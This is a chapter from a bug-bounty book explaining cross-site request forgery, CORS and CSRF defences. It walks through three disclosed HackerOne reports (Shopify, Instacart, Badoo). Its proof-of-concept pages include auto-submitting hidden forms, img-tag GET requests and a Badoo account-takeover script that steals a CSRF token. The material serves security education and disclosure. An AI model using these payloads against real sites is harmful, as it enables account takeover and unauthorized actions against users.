<html><head></head><body>
<h2 class="h2" id="ch04"><span epub:type="pagebreak" id="page_29"/><strong><span class="big">4</span><br/>CROSS-SITE REQUEST FORGERY</strong></h2>&#13;
<div class="image1"><img alt="Image" src="../images/common.jpg"/></div>&#13;
<p class="noindent">A <em>cross-site request forgery (CSRF)</em> attack occurs when an attacker can make a target’s browser send an HTTP request to another website. That website then performs an action as though the request were valid and sent by the target. Such an attack typically relies on the target being previously authenticated on the vulnerable website where the action is submitted and occurs without the target’s knowledge. When a CSRF attack is successful, the attacker is able to modify server-side information and might even take over a user’s account. Here is a basic example, which we’ll walk through shortly:</p>&#13;
<ol>&#13;
<li class="noindent">Bob logs into his banking website to check his balance.</li>&#13;
<li class="noindent">When he’s finished, Bob checks his email account on a different domain.</li>&#13;
<li class="noindent">Bob has an email with a link to an unfamiliar website and clicks the link to see where it leads.</li>&#13;
<li class="noindent"><span epub:type="pagebreak" id="page_30"/>When loaded, the unfamiliar site instructs Bob’s browser to make an HTTP request to Bob’s banking website, requesting a money transfer from his account to the attacker’s.</li>&#13;
<li class="noindent">Bob’s banking website receives the HTTP request initiated from the unfamiliar (and malicious) website. But because the banking website doesn’t have any CSRF protections, it processes the transfer.</li>&#13;
</ol>&#13;
<h3 class="h3" id="ch04lev1sec1"><strong>Authentication</strong></h3>&#13;
<p class="noindent">CRSF attacks, like the one I just described, take advantage of weaknesses in the process websites use to authenticate requests. When you visit a website that requires you to log in, usually with a username and password, that site will typically authenticate you. The site will then store that authentication in your browser so you don’t have to log in every time you visit a new page on that site. It can store the authentication in two ways: using the basic authentication protocol or a cookie.</p>&#13;
<p class="indent">You can identify a site that uses basic authorization when HTTP requests include a header that looks like this: <code>Authorization: Basic QWxhZGRpbjpPcGVuU2VzYW1l</code>. The random-looking string is a base64-encoded username and password separated by a colon. In this case, <code>QWxhZGRpbjpPcGVuU2VzYW1l</code> decodes to <code>Aladdin:OpenSesame</code>. We won’t focus on basic authentication in this chapter, but you can use many of the techniques covered here to exploit CSRF vulnerabilities that use basic authentication.</p>&#13;
<p class="indent"><em>Cookies</em> are small files that websites create and store in the user’s browser. Websites use cookies for various purposes, such as for storing information like user preferences or the user’s history of visiting a website. Cookies have certain <em>attributes</em>, which are standardized pieces of information. Those details tell browsers about the cookies and how to treat them. Some cookie attributes can include <code>domain</code>, <code>expires</code>, <code>max-age</code>, <code>secure</code>, and <code>httponly</code>, which you’ll learn about later in this chapter. In addition to attributes, cookies can contain a <em>name/value pair</em>, which consists of an identifier and an associated value that is passed to a website (the cookie’s <code>domain</code> attribute defines the site to pass this information to).</p>&#13;
<p class="indent">Browsers define the number of cookies that a site can set. But typically, single sites can set anywhere from 50 to 150 cookies in common browsers, and some reportedly support upward of 600. Browsers generally allow sites to use a maximum of 4KB per cookie. There is no standard for cookie names or values: sites are free to choose their own name/value pairs and purposes. For example, a site could use a cookie named <code>sessionId</code> to remember who a user is rather than having them enter their username and password for every page they visit or action they perform. (Recall that HTTP requests are stateless, as described in <a href="ch01.xhtml#ch01">Chapter 1</a>. Stateless means that with every HTTP request, a website doesn’t know who a user is, so it must reauthenticate that user for every request.)</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_31"/>As an example, a name/value pair in a cookie could be <code>sessionId=9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08</code> and the cookie could have a <code>domain</code> of <code>.</code><span class="codeitalic">site</span><code>.com</code>. Consequently, the <code>sessionId</code> cookie will be sent to every <em>.&lt;site&gt;.com</em> site a user visits, such as <em>foo.&lt;site&gt;.com</em>, <em>bar.&lt;site&gt;.com</em>, <em>www.&lt;site&gt;.com</em>, and so on.</p>&#13;
<p class="indent">The <code>secure</code> and <code>httponly</code> attributes tell browsers when and how to send and read cookies. These attributes don’t contain values; instead, they act as flags that are either present in the cookie or are not. When a cookie contains the <code>secure</code> attribute, browsers will only send that cookie when visiting HTTPS sites. For example, if you visited <em>http://www.&lt;site&gt;.com/</em> (an HTTP site) with a secure cookie, your browser wouldn’t send the cookie to that site. The reason is to protect your privacy, because HTTPS connections are encrypted and HTTP connections are not. The <code>httponly</code> attribute, which will become important when you learn about cross-site scripting in <a href="ch07.xhtml#ch07">Chapter 7</a>, tells the browser to read a cookie only through HTTP and HTTPS requests. Therefore, browsers won’t allow any scripting languages, such as JavaScript, to read that cookie’s value. When the <code>secure</code> and <code>httponly</code> attributes are not set in cookies, those cookies could be sent legitimately but read maliciously. A cookie without the <code>secure</code> attribute can be sent to a non-HTTPS site; likewise, a cookie without <code>httponly</code> set can be read by JavaScript.</p>&#13;
<p class="indent">The <code>expires</code> and <code>max-age</code> attributes indicate when a cookie should expire and the browser should destroy it. The <code>expires</code> attribute simply tells the browser to destroy a cookie on a specific date. For example, a cookie could set the attribute to <code>expires=Wed, 18 Dec 2019 12:00:00 UTC</code>. In contrast, the <code>max-age</code> is the number of seconds until the cookie expires and is formatted as an integer (<code>max-age=300</code>).</p>&#13;
<p class="indent">To summarize, if the banking site Bob visits uses cookies, the site will store his authentication with the following process. Once Bob visits the site and logs in, the bank will respond to his HTTP request with an HTTP response, which includes a cookie that identifies Bob. In turn, Bob’s browser will automatically send that cookie with all other HTTP requests to the banking website.</p>&#13;
<p class="indent">After finishing his banking, Bob doesn’t log out when he leaves the banking website. Note this important detail, because when you log out of a site, that site will typically respond with an HTTP response that expires your cookie. As a result, when you revisit the site, you’ll have to log in again.</p>&#13;
<p class="indent">When Bob checks his email and clicks the link to visit the unknown site, he is inadvertently visiting a malicious website. That website is designed to perform a CSRF attack by instructing Bob’s browser to make a request to his banking website. This request will also send cookies from his browser.</p>&#13;
<h3 class="h3" id="ch04lev1sec2"><strong>CSRF with GET Requests</strong></h3>&#13;
<p class="noindent">The way the malicious site exploits Bob’s banking site depends on whether the bank accepts transfers via <code>GET</code> or <code>POST</code> requests. If Bob’s banking site accepts transfers via <code>GET</code> requests, the malicious site will send the HTTP <span epub:type="pagebreak" id="page_32"/>request with either a hidden form or an <code>&lt;img&gt;</code> tag. The <code>GET</code> and <code>POST</code> methods both rely on HTML to make browsers send the required HTTP request, and both methods can use the hidden form technique, but only the <code>GET</code> method can use the <code>&lt;img&gt;</code> tag technique. In this section, we’ll look at how the attack works with the HTML <code>&lt;img&gt;</code> tag technique when using the <code>GET</code> request method, and we’ll look at the hidden form technique in the next section, “<a href="ch04.xhtml#ch04lev1sec3">CSRF with <code>POST</code> Requests</a>.”</p>&#13;
<p class="indent">The attacker needs to include Bob’s cookies in any transfer HTTP request to Bob’s banking website. But because the attacker has no way of reading Bob’s cookies, the attacker can’t just create an HTTP request and send it to the banking site. Instead, the attacker can use the HTML <code>&lt;img&gt;</code> tag to create a <code>GET</code> request that also includes Bob’s cookies. An <code>&lt;img&gt;</code> tag renders images on a web page and includes an <code>src</code> attribute, which tells browsers where to locate image files. When a browser renders an <code>&lt;img&gt;</code> tag, it will make an HTTP <code>GET</code> request to the <code>src</code> attribute in the tag and include any existing cookies in that request. So, let’s say that the malicious site uses a URL like the following that transfers $500 from Bob to Joe:</p>&#13;
<pre>https://www.<span class="codeitalic1">bank</span>.com/transfer?from=bob&amp;to=joe&amp;amount=500</pre>&#13;
<p class="indent">Then the malicious <code>&lt;img&gt;</code> tag would use this URL as its source value, as in the following tag:</p>&#13;
<pre>&lt;img src="https://www.<span class="codeitalic1">bank</span>.com/transfer?from=bob&amp;to=joe&amp;amount=500"&gt;</pre>&#13;
<p class="indent">As a result, when Bob visits the attacker-owned site, it includes the <code>&lt;img&gt;</code> tag in its HTTP response, and the browser then makes the HTTP <code>GET</code> request to the bank. The browser sends Bob’s authentication cookies to get what it thinks should be an image. But in fact, the bank receives the request, processes the URL in the tag’s <code>src</code> attribute, and creates the transfer request.</p>&#13;
<p class="indent">To avoid this vulnerability, developers should never use HTTP <code>GET</code> requests to perform any backend data-modifying requests, such as transferring money. But any request that is read-only should be safe. Many common web frameworks used to build websites, such as Ruby on Rails, Django, and so on, will expect developers to follow this principle, and so they’ll automatically add CSRF protections to <code>POST</code> requests but not <code>GET</code> requests.</p>&#13;
<h3 class="h3" id="ch04lev1sec3"><strong>CSRF with POST Requests</strong></h3>&#13;
<p class="noindent">If the bank performs transfers with <code>POST</code> requests, you’ll need to use a different approach to create a CSRF attack. An attacker couldn’t use an <code>&lt;img&gt;</code> tag, because an <code>&lt;img&gt;</code> tag can’t invoke a <code>POST</code> request. Instead, the attacker’s strategy will depend on the contents of the <code>POST</code> request.</p>&#13;
<p class="indent">The simplest situation involves a <code>POST</code> request with the content-type <code>application/x-www-form-urlencoded</code> or <code>text/plain</code>. The content-type is a header <span epub:type="pagebreak" id="page_33"/>that browsers might include when sending HTTP requests. The header tells the recipient how the body of the HTTP request is encoded. Here is an example of a <code>text/plain</code> content-type request:</p>&#13;
<pre>   POST / HTTP/1.1<br/>&#13;
   Host: www.google.ca<br/>&#13;
   User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:50.0) Gecko/20100101 Firefox/50.0<br/>&#13;
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8<br/>&#13;
   Content-Length: 5<br/>&#13;
<span class="ent">➊</span> Content-Type: text/plain;charset=UTF-8<br/>&#13;
   DNT: 1<br/>&#13;
   Connection: close<br/>&#13;
   hello</pre>&#13;
<p class="indent">The content-type <span class="ent">➊</span> is labeled, and its type is listed along with the character encoding of the request. The content-type is important because browsers treat types differently (which I’ll get to in a second).</p>&#13;
<p class="indent">In this situation, it’s possible for a malicious site to create a hidden HTML form and submit it silently to the vulnerable site without the target’s knowledge. The form can submit a <code>POST</code> or <code>GET</code> request to a URL and can even submit parameter values. Here is an example of some harmful code in the website that the malicious link would direct Bob to:</p>&#13;
<pre><span class="ent">➊</span> &lt;iframe style="display:none" name="csrf-frame"&gt;&lt;/iframe&gt;<br/>&#13;
<span class="ent">➋</span> &lt;form method='POST' action='http://<span class="codeitalic1">bank</span>.com/transfer' target="csrf-frame"<br/>&#13;
   id="csrf-form"&gt;<br/>&#13;
  <span class="ent">➌</span> &lt;input type='hidden' name='from' value='Bob'&gt;<br/>&#13;
     &lt;input type='hidden' name='to' value='Joe'&gt;<br/>&#13;
     &lt;input type='hidden' name='amount' value='500'&gt;<br/>&#13;
     &lt;input type='submit' value='submit'&gt;<br/>&#13;
   &lt;/form&gt;<br/>&#13;
<span class="ent">➍</span> &lt;script&gt;document.getElementById("csrf-form").submit()&lt;/script&gt;</pre>&#13;
<p class="indent">Here, we’re making an HTTP <code>POST</code> request <span class="ent">➋</span> to Bob’s bank with a form (which is denoted by the action attribute in the <code>&lt;form&gt;</code> tag). Because the attacker doesn’t want Bob to see the form, each of the <code>&lt;input&gt;</code> elements <span class="ent">➌</span> are given the type <code>'hidden'</code>, which makes them invisible on the web page Bob sees. As the final step, the attacker includes some JavaScript inside a <code>&lt;script&gt;</code> tag to automatically submit the form when the page is loaded <span class="ent">➍</span>. The JavaScript does this by calling the <code>getElementByID()</code> method on the HTML document with the ID of the form (<code>"csrf-form"</code>) that we set in the second line <span class="ent">➋</span> as an argument. As with a <code>GET</code> request, once the form is submitted, the browser makes the HTTP <code>POST</code> request to send Bob’s cookies to the bank site, which invokes a transfer. Because <code>POST</code> requests send an HTTP response back to the browser, the attacker hides the response in an iFrame using the <code>display:none</code> attribute <span class="ent">➊</span>. As a result, Bob doesn’t see it and doesn’t realize what has happened.</p>&#13;
<p class="indent">In other scenarios, a site might expect the <code>POST</code> request to be submitted with the content-type <code>application/json</code> instead. In some cases, a request that is an <code>application/json</code> type will have a <em>CSRF token</em>. This token is a value <span epub:type="pagebreak" id="page_34"/>that is submitted with the HTTP request so the legitimate site can validate that the request originated from itself, not from another, malicious site. Sometimes the HTTP body of the <code>POST</code> request includes the token, but at other times the <code>POST</code> request has a custom header with a name like <code>X-CSRF-TOKEN</code>. When a browser sends an <code>application/json POST</code> request to a site, it will send an <code>OPTIONS</code> HTTP request before the <code>POST</code> request. The site then returns a response to the <code>OPTIONS</code> call indicating which types of HTTP requests it accepts and from what trusted origins. This is referred to as a preflight <code>OPTIONS</code> call. The browser reads this response and then makes the appropriate HTTP request, which in our bank example would be a <code>POST</code> request for the transfer.</p>&#13;
<p class="indent">If implemented correctly, the preflight <code>OPTIONS</code> call protects against some CSRF vulnerabilities: the malicious sites won’t be listed as trusted sites by the server, and browsers will only allow specific websites (known as <em>white-listed websites</em>) to read the HTTP <code>OPTIONS</code> response. As a result, because the malicious site can’t read the <code>OPTIONS</code> response, browsers won’t send the malicious <code>POST</code> request.</p>&#13;
<p class="indent">The set of rules defining when and how websites can read responses from each other is called <em>cross-origin resource sharing (CORS)</em>. CORS restricts resource access, including JSON response access, from a domain outside that which served the file or is allowed by the site being tested. In other words, when developers use CORS to protect a site, you can’t submit an <code>application/json</code> request to call the application being tested, read the response, and make another call unless the site being tested allows it. In some situations, you can bypass these protections by changing the <code>content-type</code> header to <code>application/x-www-form-urlencoded</code>, <code>multipart/form-data</code>, or <code>text/plain</code>. Browsers don’t send preflight <code>OPTIONS</code> calls for any of these three content-types when making a <code>POST</code> request, so a CSRF request might work. If it doesn’t, look at the <code>Access-Control-Allow-Origin</code> header in the server’s HTTP responses to double-check that the server is not trusting arbitrary origins. If that response header changes when requests are sent from arbitrary origins, the site might have bigger problems because it allows any origin to read responses from its server. This allows for CSRF vulnerabilities but might also allow malicious attackers to read any sensitive data returned in the server’s HTTP responses.</p>&#13;
<h3 class="h3" id="ch04lev1sec4"><strong>Defenses Against CSRF Attacks</strong></h3>&#13;
<p class="noindent">You can mitigate CSRF vulnerabilities in a number of ways. One of the most popular forms of protection against CSRF attacks is the CSRF token. Protected sites require the CSRF token when requests are submitted that could potentially alter data (that is, <code>POST</code> requests). In such a situation, a web application (like Bob’s bank) would generate a token with two parts: one that Bob would receive and one that the application would retain. When Bob attempts to make transfer requests, he would have to submit his token, which the bank would then validate with its side of the token. The design of these tokens makes them unguessable and only accessible to the specific user they’re assigned to (like Bob). In addition, they aren’t always obviously <span epub:type="pagebreak" id="page_35"/>named, but some potential examples of names include <code>X-CSRF-TOKEN</code>, <code>lia-token</code>, <code>rt</code>, or <code>form-id</code>. Tokens can be included in HTTP request headers, in an HTTP <code>POST</code> body, or as a hidden field, as in the following example:</p>&#13;
<pre>&lt;form method='POST' action='http://<span class="codeitalic1">bank</span>.com/transfer'&gt;<br/>&#13;
  &lt;input type='text' name='from' value='Bob'&gt;<br/>&#13;
  &lt;input type='text' name='to' value='Joe'&gt;<br/>&#13;
  &lt;input type='text' name='amount' value='500'&gt;<br/>&#13;
  &lt;input type='hidden' name='csrf' value='lHt7DDDyUNKoHCC66BsPB8aN4p24hxNu6ZuJA+8l+YA='&gt;<br/>&#13;
  &lt;input type='submit' value='submit'&gt;<br/>&#13;
&lt;/form&gt;</pre>&#13;
<p class="indent">In this example, the site could get the CSRF token from a cookie, an embedded script on the website, or as part of the content delivered from the site. Regardless of the method, only the target’s web browser would know and be able to read the value. Because the attacker couldn’t submit the token, they wouldn’t be able to successfully submit a <code>POST</code> request and wouldn’t be able to carry out a CSRF attack. However, just because a site uses CSRF tokens doesn’t mean it’s a dead end when you’re searching for vulnerabilities to exploit. Try removing the token, changing its value, and so on to confirm the token has been properly implemented.</p>&#13;
<p class="indent">The other way sites protect themselves is by using CORS; however, this isn’t foolproof because it relies on browser security and ensuring proper CORS configurations to determine when third-party sites can access responses. Attackers can sometimes bypass CORS by changing the content-type from <code>application/json</code> to <code>application/x-www-form-urlencoded</code> or by using a <code>GET</code> request instead of a <code>POST</code> request because of misconfigurations on the server side. The reason the bypass works is that browsers will automatically send an <code>OPTIONS HTTP</code> request when the content type is <code>application/json</code> but won’t automatically send an <code>OPTIONS HTTP</code> request if it’s a <code>GET</code> request or the content type is <code>application/x-www-form-urlencoded</code>.</p>&#13;
<p class="indent">Lastly, there are two additional and less common CSRF mitigation strategies. First, the site could check the value of the <code>Origin</code> or <code>Referer</code> header submitted with an HTTP request and ensure it contains the expected value. For example, in some cases, Twitter will check the <code>Origin</code> header and, if it’s not included, check the <code>Referer</code> header. This works because browsers control these headers and attackers can’t set or change them remotely (obviously, this excludes exploiting a vulnerability in browsers or browser plug-ins that might allow an attacker to control either header). Second, browsers are now beginning to implement support for a new cookie attribute called <code>samesite</code>. This attribute can be set as <code>strict</code> or <code>lax</code>. When set as <code>strict</code>, the browser will not send the cookie with any HTTP request that doesn’t originate from the site. This includes even simple HTTP <code>GET</code> requests. For example, if you were logged into Amazon and it used <code>strict samesite</code> cookies, the browser would not submit your cookies if you were following a link from another site. Also, Amazon would not recognize you as logged in until you visited another Amazon web page and the cookies were then submitted. In contrast, setting the <code>samesite</code> attribute as <code>lax</code> instructs browsers to send cookies with initial <code>GET</code> requests. This supports the design principle that <code>GET</code> requests <span epub:type="pagebreak" id="page_36"/>should never alter data on the server side. In this case, if you were logged into Amazon and it used <code>lax samesite</code> cookies, the browser would submit your cookies and Amazon would recognize you as logged in if you had been redirected there from another site.</p>&#13;
<h3 class="h3" id="ch04lev1sec5"><strong>Shopify Twitter Disconnect</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Low</p>&#13;
<p class="hang"><strong>URL:</strong> <em>https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect/</em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://www.hackerone.com/reports/111216/">https://www.hackerone.com/reports/111216/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> January 17, 2016</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $500</p>&#13;
<p class="noindent">When you’re looking for potential CSRF vulnerabilities, be on the lookout for <code>GET</code> requests that modify server-side data. For example, a hacker discovered a vulnerability in a Shopify feature that integrated Twitter into the site to let shop owners tweet about their products. The feature also allowed users to disconnect a Twitter account from a connected shop. The URL to disconnect a Twitter account was the following:</p>&#13;
<pre>https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect/</pre>&#13;
<p class="indent">As it turns out, visiting this URL would send a <code>GET</code> request to disconnect the account, as follows:</p>&#13;
<pre>GET /auth/twitter/disconnect HTTP/1.1<br/>&#13;
Host: twitter-commerce.shopifyapps.com<br/>&#13;
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:43.0) Gecko/20100101 Firefox/43.0<br/>&#13;
Accept: text/html, application/xhtml+xml, application/xml<br/>&#13;
Accept-Language: en-US,en;q=0.5<br/>&#13;
Accept-Encoding: gzip, deflate<br/>&#13;
Referer: https://twitter-commerce.shopifyapps.com/account<br/>&#13;
Cookie: _twitter-commerce_session=REDACTED<br/>&#13;
Connection: keep-alive</pre>&#13;
<p class="indent">In addition, when the link was originally implemented, Shopify wasn’t validating the legitimacy of the <code>GET</code> requests sent to it, making the URL vulnerable to CSRF.</p>&#13;
<p class="indent">The hacker WeSecureApp, who filed the report, provided the following proof-of-concept HTML document:</p>&#13;
<pre>&lt;html&gt;<br/>&#13;
  &lt;body&gt;<br/>&#13;
  <span class="ent">➊</span> &lt;img src="https://twitter-commerce.shopifyapps.com/auth/twitter/disconnect"&gt;<br/>&#13;
  &lt;/body&gt;<br/>&#13;
&lt;/html&gt;</pre>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_37"/>When opened, this HTML document would cause the browser to send an HTTP <code>GET</code> request to <em>https://twitter-commerce.shopifyapps.com</em> through the <code>&lt;img&gt;</code> tag’s <code>src</code> attribute <span class="ent">➊</span>. If someone with a Twitter account connected to Shopify visited a web page with this <code>&lt;img&gt;</code> tag, their Twitter account would be disconnected from Shopify.</p>&#13;
<h4 class="h4" id="ch04lev2sec1"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">Keep an eye out for HTTP requests that perform some action on the server, such as disconnecting a Twitter account, via a <code>GET</code> request. As mentioned earlier, <code>GET</code> requests should never modify any data on the server. In this situation, you could have found the vulnerability by using a proxy server, such as Burp or OWASP’s ZAP, to monitor the HTTP requests being sent to Shopify.</p>&#13;
<h3 class="h3" id="ch04lev1sec6"><strong>Change Users Instacart Zones</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Low</p>&#13;
<p class="hang"><strong>URL:</strong> <em>https://admin.instacart.com/api/v2/zones/</em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://hackerone.com/reports/157993/">https://hackerone.com/reports/157993/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> August 9, 2015</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $100</p>&#13;
<p class="noindent">When you’re looking at the attack surface, remember to consider a website’s API endpoints as well as its web pages. Instacart is a grocery delivery app that allows its deliverers to define the zones they work in. The site updated these zones with a <code>POST</code> request to the Instacart admin subdomain. A hacker discovered that the zone’s endpoint on this subdomain was vulnerable to CSRF. For example, you could modify a target’s zone with the following code:</p>&#13;
<pre>&lt;html&gt;<br/>&#13;
  &lt;body&gt;<br/>&#13;
  <span class="ent">➊</span> &lt;form action="https://admin.instacart.com/api/v2/zones" method="POST"&gt;<br/>&#13;
    <span class="ent">➋</span> &lt;input type="hidden" name="zip" value="10001" /&gt;<br/>&#13;
    <span class="ent">➌</span> &lt;input type="hidden" name="override" value="true" /&gt;<br/>&#13;
    <span class="ent">➍</span> &lt;input type="submit" value="Submit request" /&gt;<br/>&#13;
    &lt;/form&gt;<br/>&#13;
  &lt;/body&gt;<br/>&#13;
&lt;/html&gt;</pre>&#13;
<p class="indent">In this example, the hacker created an HTML form to send an HTTP <code>POST</code> request to the <code>/api/v2/zones</code> endpoint <span class="ent">➊</span>. The hacker included two hidden inputs: one to set the user’s new zone to the ZIP code <code>10001</code> <span class="ent">➋</span> and one to set the API’s <code>override</code> parameter to <code>true</code> <span class="ent">➌</span> so the user’s current <code>zip</code> value was replaced with the hacker’s submitted value. Additionally, the hacker included a submit button to make the <code>POST</code> request <span class="ent">➍</span>, unlike the Shopify example, which used an auto-submitting JavaScript function.</p>&#13;
<p class="indent"><span epub:type="pagebreak" id="page_38"/>Although this example is still successful, the hacker could improve the exploit by using the techniques described earlier, such as using a hidden iFrame to auto-submit the request on the target’s behalf. This would demonstrate to the Instacart bug bounty triagers how an attacker could use this vulnerability with less target action; vulnerabilities that are entirely attacker controlled are more likely to be successfully exploited than those that aren’t.</p>&#13;
<h4 class="h4" id="ch04lev2sec2"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">When you’re looking for exploits, broaden your attack scope and look beyond just a website’s pages to include its API endpoints, which offer great potential for vulnerabilities. Occasionally, developers forget that hackers can discover and exploit API endpoints, because they aren’t readily available like web pages. For example, mobile applications often make HTTP requests to API endpoints, which you can monitor with Burp or ZAP just as you do websites.</p>&#13;
<h3 class="h3" id="ch04lev1sec7"><strong>Badoo Full Account Takeover</strong></h3>&#13;
<p class="hangt"><strong>Difficulty:</strong> Medium</p>&#13;
<p class="hang"><strong>URL:</strong> <em><a href="https://www.badoo.com/">https://www.badoo.com/</a></em></p>&#13;
<p class="hang"><strong>Source:</strong> <em><a href="https://hackerone.com/reports/127703/">https://hackerone.com/reports/127703/</a></em></p>&#13;
<p class="hang"><strong>Date reported:</strong> April 1, 2016</p>&#13;
<p class="hangb"><strong>Bounty paid:</strong> $852</p>&#13;
<p class="noindent">Although developers often use CSRF tokens to protect against CSRF vulnerabilities, in some cases, attackers can steal the tokens, as you’ll see in this bug. If you explore the social networking website <em><a href="https://www.badoo.com/">https://www.badoo.com/</a></em>, you’ll see that it uses CSRF tokens. More specifically, it uses a URL parameter, <code>rt</code>, which is unique to each user. When Badoo’s bug bounty program went live on HackerOne, I couldn’t find a way to exploit it. However, the hacker Mahmoud Jamal did.</p>&#13;
<p class="indent">Jamal recognized the <code>rt</code> parameter and its significance. He also noticed that the parameter was returned in almost all JSON responses. Unfortunately, this wasn’t helpful because CORS protects Badoo from attackers reading those responses, since they’re encoded as <code>application/json</code> content types. But Jamal kept digging.</p>&#13;
<p class="indent">Jamal eventually found the JavaScript file <em><a href="https://eu1.badoo.com/worker-scope/chrome-service-worker.js">https://eu1.badoo.com/worker-scope/chrome-service-worker.js</a></em>, which contained a variable called <code>url_stats</code> and was set to the following value:</p>&#13;
<pre>var url_stats = 'https://eu1.badoo.com/chrome-push-stats?ws=1&amp;rt=<span class="codeitalic1">&lt;</span><span class="ent">➊</span><span class="codeitalic1">rt_param_value&gt;</span>';</pre>&#13;
<p class="indent">The <code>url_stats</code> variable stored a URL that contained the user’s unique <code>rt</code> value as a parameter when the user’s browser accessed the JavaScript file <span class="ent">➊</span>. Even better, to obtain the user’s <code>rt</code> value, an attacker would just need the target to visit a malicious web page that would access the JavaScript file. CORS does not block this because browsers are allowed to read and embed <span epub:type="pagebreak" id="page_39"/>remote JavaScript files from external sources. The attacker could then use the <code>rt</code> value to link any social media account with the user’s Badoo account. As a result, the attacker could invoke HTTP <code>POST</code> requests to modify the target’s account. Here’s the HTML page Jamal used to accomplish this exploit:</p>&#13;
<pre>&lt;html&gt;<br/>&#13;
  &lt;head&gt;<br/>&#13;
    &lt;title&gt;Badoo account take over&lt;/title&gt;<br/>&#13;
  <span class="ent">➊</span> &lt;script src=https://eu1.badoo.com/worker-scope/chrome-service-worker.<br/>&#13;
    js?ws=1&gt;&lt;/script&gt;<br/>&#13;
  &lt;/head&gt;<br/>&#13;
  &lt;body&gt;<br/>&#13;
    &lt;script&gt;<br/>&#13;
    <span class="ent">➋</span> function getCSRFcode(str) {<br/>&#13;
        return str.split('=')[2];<br/>&#13;
      }<br/>&#13;
    <span class="ent">➌</span> window.onload = function(){<br/>&#13;
      <span class="ent">➍</span> var csrf_code = getCSRFcode(url_stats);<br/>&#13;
      <span class="ent">➎</span> csrf_url = 'https://eu1.badoo.com/google/verify.phtml?code=4/nprfspM3y<br/>&#13;
        fn2SFUBear08KQaXo609JkArgoju1gZ6Pc&amp;authuser=3&amp;session_state=7cb85df679<br/>&#13;
        219ce71044666c7be3e037ff54b560..a810&amp;prompt=none&amp;rt='+ csrf_code;<br/>&#13;
      <span class="ent">➏</span> window.location = csrf_url;<br/>&#13;
      };<br/>&#13;
    &lt;/script&gt;<br/>&#13;
  &lt;/body&gt;<br/>&#13;
&lt;/html&gt;</pre>&#13;
<p class="indent">When a target loads this page, the page will load the Badoo JavaScript by referencing it as the <code>src</code> attribute in a <code>&lt;script&gt;</code> tag <span class="ent">➊</span>. Having loaded the script, the web page then calls the JavaScript function <code>window.onload</code>, which defines an anonymous JavaScript function <span class="ent">➌</span>. Browsers call the <code>onload</code> event handler when a web page loads; because the function Jamal defined is in the <code>window.onload</code> handler, his function will always be called when the page is loaded.</p>&#13;
<p class="indent">Next, Jamal created a <code>csrf_code</code> variable <span class="ent">➍</span> and assigned it the return value of a function he defined at <span class="ent">➋</span> called <code>getCSRFcode</code>. The <code>getCSRFcode</code> function takes and splits a string into an array of strings at each <code>'='</code> character. It then returns the value of the third member of the array. When the function parses the variable <code>url_stats</code> from Badoo’s vulnerable JavaScript file at <span class="ent">➍</span>, it splits the string into the following array value:</p>&#13;
<pre>https://eu1.badoo.com/chrome-push-stats?ws,1&amp;rt,<span class="codeitalic1">&lt;rt_param_value&gt;</span></pre>&#13;
<p class="indent">Then the function returns the third member of the array, which is the <code>rt</code> value, and assigns that to <code>csrf_code</code>.</p>&#13;
<p class="indent">Once he had the CSRF token, Jamal created the <code>csrf_url</code> variable, which stores a URL to Badoo’s <em>/google/verify.phtml</em> web page. The web page links his own Google account to the target’s Badoo account <span class="ent">➎</span>. This page requires some parameters, which are hardcoded into the URL string. I won’t cover them in detail here because they’re specific to Badoo. However, note the final <code>rt</code> parameter, which doesn’t have a hardcoded value. Instead, <code>csrf_code</code> <span epub:type="pagebreak" id="page_40"/>is concatenated to the end of the URL string so it’s passed as the <code>rt</code> parameter’s value. Jamal then makes an HTTP request by invoking <code>window.location</code> <span class="ent">➏</span> and assigns it to <code>csrf_url</code>, which redirects the visiting user’s browser to the URL at <span class="ent">➎</span>. This results in a <code>GET</code> request to Badoo, which validates the <code>rt</code> parameter and processes the request to link the target’s Badoo account to Jamal’s Google account, thereby completing the account takeover.</p>&#13;
<h4 class="h4" id="ch04lev2sec3"><strong><em>Takeaways</em></strong></h4>&#13;
<p class="noindent">Where there’s smoke, there’s fire. Jamal noticed that the <code>rt</code> parameter was being returned in different locations, particularly in JSON responses. For that reason, he rightly guessed that <code>rt</code> might show up someplace where an attacker could access and exploit it, which in this case was a JavaScript file. If you feel like a site might be vulnerable, keep digging. In this case, I thought it was odd that the CSRF token would only be five digits long and included in URLs. Normally, tokens are much longer, making them harder to guess, and included in HTTP <code>POST</code> request bodies, not URLs. Use a proxy and check all the resources that are being called when you visit a site or application. Burp allows you to search through all your proxy history to look for specific terms or values, which would have revealed the <code>rt</code> value included in the JavaScript files here. You might find an information leak with sensitive data, such as a CSRF token.</p>&#13;
<h3 class="h3" id="ch04lev1sec8"><strong>Summary</strong></h3>&#13;
<p class="noindent">CSRF vulnerabilities represent another attack vector that attackers can execute without the target even knowing or actively performing an action. Finding CSRF vulnerabilities can take some ingenuity and a willingness to test all functionality on a site.</p>&#13;
<p class="indent">Generally, application frameworks, such as Ruby on Rails, are increasingly protecting web forms if the site is performing <code>POST</code> requests; however, this isn’t the case for <code>GET</code> requests. Therefore, be sure to keep an eye out for any <code>GET</code> HTTP calls that change server-side user data (like disconnecting Twitter accounts). Also, although I didn’t include an example of it, if you see that a site is sending a CSRF token with a <code>POST</code> request, you can try changing the CSRF token value or removing it entirely to ensure the server is validating its existence.</p>&#13;
</body></html>